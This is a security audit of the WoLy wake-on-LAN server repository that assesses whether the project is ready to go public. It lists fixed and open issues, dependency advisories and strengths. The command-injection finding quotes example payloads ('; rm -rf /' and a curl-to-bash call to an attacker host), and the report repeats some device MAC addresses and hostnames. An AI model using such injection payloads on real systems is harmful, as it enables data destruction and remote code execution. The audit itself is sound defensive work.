# WoLy Server — Security Audit & Public-Readiness Assessment

**Date:** 2026-02-08
**Scope:** Full repository (`apps/cnc`, `apps/node-agent`, `packages/protocol`)

---

## Executive Summary

The WoLy server codebase follows many security best practices: parameterized SQL queries, Helmet security headers, Zod schema validation on WebSocket messages, timing-safe token comparison, and proper `.gitignore` rules. However, several issues were found that need attention — some of which have been **fixed in this PR**, and others that remain as known risks to address over time.

### Verdict: Can You Make This Repo Public?

**Yes, after the fixes in this PR are merged.** The codebase is generally well-structured and doesn't contain leaked production secrets. The critical items (committed database with real device data, command injection vector) have been fixed here. The remaining items are hardening measures — important for production, but not blockers for a public repo.

---

## Critical Issues (Fixed in This PR)

### 1. Committed SQLite Database with Real Device Data

| Severity | Status |
|----------|--------|
| **CRITICAL** | ✅ **FIXED** |

**Finding:** `apps/cnc/db/woly-cnc.db` was committed to version control containing:
- Real MAC addresses (e.g., `80:6D:97:60:39:08`, `BC:07:1D:DD:5B:9C`)
- Real device hostnames (e.g., `PHANTOM-MBP`, `PHANTOM-NAS`, `RASPBERRYPI`)
- Internal IP addresses (192.168.1.x range)
- Network topology metadata (subnet, gateway)

**Risk:** Exposes your home network device inventory to anyone who clones the repo, including historical git data.

**Fix applied:** Removed the database file from tracking, and strengthened `.gitignore` with an explicit `**/db/*.db` pattern.

**Remaining action:** ~~After making the repo public, consider using `git filter-repo` or BFG Repo-Cleaner to purge the file from git history entirely. Otherwise the data remains accessible via `git log`.~~ **Done.** History purged with `git filter-repo` on 2026-02-08.

### 2. Command Injection in Network Discovery

| Severity | Status |
|----------|--------|
| **CRITICAL** | ✅ **FIXED** |

**Finding:** `apps/node-agent/src/services/networkDiscovery.ts` used `execSync()` with string interpolation:
```typescript
// BEFORE (vulnerable)
execSync(`nbtstat -A ${ip}`, ...)
execSync(`nmblookup -A ${ip}`, ...)
```

If an attacker could influence the `ip` parameter (e.g., via crafted ARP responses), they could inject shell commands like `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)`.

**Fix applied:** Replaced with `execFileSync()` which passes arguments as an array, preventing shell interpretation:
```typescript
// AFTER (safe)
execFileSync('nbtstat', ['-A', ip], ...)
execFileSync('nmblookup', ['-A', ip], ...)
```

### 3. Weak Command ID Generation

| Severity | Status |
|----------|--------|
| **MEDIUM** | ✅ **FIXED** |

**Finding:** `apps/cnc/src/services/commandRouter.ts` used `Math.random()` for command IDs:
```typescript
`cmd_${Date.now()}_${Math.random().toString(36).substring(7)}`
```
`Math.random()` is not cryptographically secure and the timestamp prefix makes IDs predictable.

**Fix applied:** Replaced with `crypto.randomUUID()`:
```typescript
`cmd_${randomUUID()}`
```

### 4. Missing Request Body Size Limits

| Severity | Status |
|----------|--------|
| **HIGH** | ✅ **FIXED** |

**Finding:** Both `apps/cnc/src/server.ts` and `apps/node-agent/src/app.ts` used `express.json()` with no size limit, allowing arbitrarily large request bodies (memory exhaustion DoS).

**Fix applied:** Added `{ limit: '100kb' }` to both servers.

### 5. Missing WebSocket Message Size Limit

| Severity | Status |
|----------|--------|
| **HIGH** | ✅ **FIXED** |

**Finding:** `apps/cnc/src/websocket/server.ts` created the WebSocket server with no `maxPayload`, allowing gigabyte-sized messages that could exhaust server memory.

**Fix applied:** Added `maxPayload: 256 * 1024` (256 KB) limit.

### 6. Hardcoded Secrets in docker-compose.yml

| Severity | Status |
|----------|--------|
| **MEDIUM** | ✅ **FIXED** |

**Finding:** `apps/cnc/docker-compose.yml` contained hardcoded database password (`woly_password`), JWT secret, and auth tokens with fallback defaults.

**Fix applied:** Replaced with `${VAR:?Set VAR in .env}` syntax that requires explicit configuration and fails fast if secrets aren't set.

### 7. Placeholder CORS Origin in Production

| Severity | Status |
|----------|--------|
| **MEDIUM** | ✅ **FIXED** |

**Finding:** `apps/cnc/src/server.ts` had a hardcoded placeholder `https://your-mobile-app-domain.com` as the production CORS origin, which would never match any real request.

**Fix applied:** Changed to read from `CORS_ORIGINS` environment variable (comma-separated list).

---

## Known Risks (Not Fixed — Require Design Decisions)

### 8. Node-Agent API Has No Authentication

| Severity | Impact |
|----------|--------|
| **HIGH** | Anyone with network access can wake computers, add/delete hosts, trigger scans |

The node-agent API (`/hosts/*`) has zero authentication. All endpoints are publicly accessible. This is by design for the standalone mode (local LAN use), but risky if the agent is exposed beyond the local network.

**Recommendation:** Add optional API key authentication that can be enabled via environment variable. When `NODE_API_KEY` is set, require it in an `Authorization` header.

### 9. CnC Node Listing Routes Are Unauthenticated

| Severity | Impact |
|----------|--------|
| **MEDIUM** | `GET /api/nodes`, `GET /api/nodes/:id`, `GET /api/nodes/:id/health` require no JWT |

While host management endpoints are properly JWT-protected, the node listing endpoints expose node metadata (IDs, locations, capabilities, last heartbeat) to anyone.

**Recommendation:** Move node listing behind `authenticateJwt` middleware if the API is internet-facing.

### 10. No Rate Limiting on CnC Token Exchange

| Severity | Impact |
|----------|--------|
| **MEDIUM** | `POST /api/auth/token` can be brute-forced with no throttling |

**Recommendation:** Add `express-rate-limit` (already used by node-agent) to the CnC app, especially on the auth endpoint.

### 11. No WebSocket Message Rate Limiting

| Severity | Impact |
|----------|--------|
| **LOW** | A connected node could flood the server with messages |

**Recommendation:** Implement per-connection message rate limiting (e.g., 100 messages/second).

### 12. No WebSocket Connection Limits per IP

| Severity | Impact |
|----------|--------|
| **LOW** | An attacker could open many WebSocket connections from the same IP |

**Recommendation:** Track connections per IP and enforce a maximum (e.g., 10 per IP).

### 13. Overly Broad CORS on Node-Agent

| Severity | Impact |
|----------|--------|
| **LOW** | Allows ANY `*.ngrok-free.app` and `*.netlify.app` subdomain |

This is fine for development but should be tightened for production deployments.

### 14. Session Token Secret Defaults to JWT Secret

| Severity | Impact |
|----------|--------|
| **LOW** | If `JWT_SECRET` is compromised, WebSocket session tokens are also compromised |

`WS_SESSION_TOKEN_SECRETS` defaults to `JWT_SECRET` in the CnC config. Best practice: use separate secrets.

---

## Dependency Vulnerabilities

### npm audit Results

```
3 high severity vulnerabilities

get-ip-range  *  → DoS vulnerability (GHSA-6q4w-3wp4-q5wf)
ip  *            → SSRF improper categorization (GHSA-2p57-rm9w-gvfp)
local-devices *  → Depends on vulnerable get-ip-range and ip
```

All three vulnerabilities are in the `local-devices` dependency chain (used by node-agent for ARP scanning). Fix available via `npm audit fix --force` (breaking change to `local-devices@3.0.0`).

**Recommendation:** Test `local-devices@3.0.0` and upgrade if ARP scanning still works correctly.

### Notable Dependencies

| Package | Notes |
|---------|-------|
| `local-devices` | ARP scanning library — uncommon, verify maintenance status |
| `wake_on_lan` | Pinned to `1.0.0` — check if maintained |
| `ping` | Network ping — verify it's the expected npm package |
| `better-sqlite3` | Well-maintained, properly used with parameterized queries ✅ |

---

## What's Done Well

| Area | Details |
|------|---------|
| **SQL Injection** | ✅ All queries use parameterized statements throughout both apps |
| **Zod Validation** | ✅ All WebSocket messages validated against discriminated union schemas |
| **JWT Auth** | ✅ HS256 enforced, expiry checked, timing-safe comparison, issuer/audience validated |
| **Token Handling** | ✅ Timing-safe comparison (`timingSafeEqual`) prevents timing attacks |
| **Session Tokens** | ✅ Secret rotation support, clock skew tolerance, lifetime bounds |
| **Security Headers** | ✅ Helmet.js enabled on both apps |
| **Graceful Shutdown** | ✅ Both apps handle SIGTERM/SIGINT properly |
| **Docker Security** | ✅ Multi-stage builds, non-root user (`nodejs:1001`), Alpine images |
| **Secret Management** | ✅ `.env` files properly gitignored, no production secrets in code |
| **Log Sanitization** | ✅ Sensitive data (tokens) sanitized in CnC client logs |
| **TLS Enforcement** | ✅ `WS_REQUIRE_TLS` option available for WebSocket connections |
| **Error Handling** | ✅ Stack traces only exposed in development mode |

---

## Public Repo Checklist

Before making the repository public:

- [x] Remove committed database with real device data
- [x] Fix command injection vulnerability
- [x] Remove hardcoded secrets from docker-compose.yml
- [x] Fix placeholder CORS origin
- [x] Add request body size limits
- [x] Add WebSocket message size limits
- [x] Use cryptographically secure command IDs
- [x] Purge database file from git history (`git filter-repo` — completed 2026-02-08)
- [ ] Run `npm audit fix` for dependency vulnerabilities
- [ ] Consider adding API authentication to node-agent
- [ ] Consider adding rate limiting to CnC auth endpoint
- [ ] Review the `.env.example` files — ensure no real values leaked

---

## My Honest Take

**You should make it public.** Here's why:

1. **The code quality is above average** for a personal project. Parameterized queries, proper JWT handling with timing-safe comparisons, Zod validation, Helmet headers — you've clearly thought about security from the start.

2. **The critical issues are fixable** (and have been fixed in this PR). The command injection was the scariest finding, but it was limited to NetBIOS hostname lookups where the IP comes from ARP scan results — not directly from user input. Still needed fixing, but the blast radius was contained.

3. **No production secrets were leaked.** The `.env` files were never committed. The docker-compose defaults were development-only values. The biggest exposure was the SQLite database with real MAC addresses and device names from your home network.

4. **The architecture is sensible.** Separating the protocol package, using workspace links, having proper build ordering — this is well-organized code that other developers could learn from.

5. **Things to address for production hardening** (not blocking for public repo):
   - Add API authentication to the node-agent if it'll ever face the internet
   - Add rate limiting to the CnC endpoints
   - Upgrade `local-devices` to fix the npm audit findings
   - Consider adding a pre-commit hook with `git-secrets` or similar to prevent accidental credential commits

The repo is a good example of a WoL management system. Making it public with these fixes applied is reasonable.
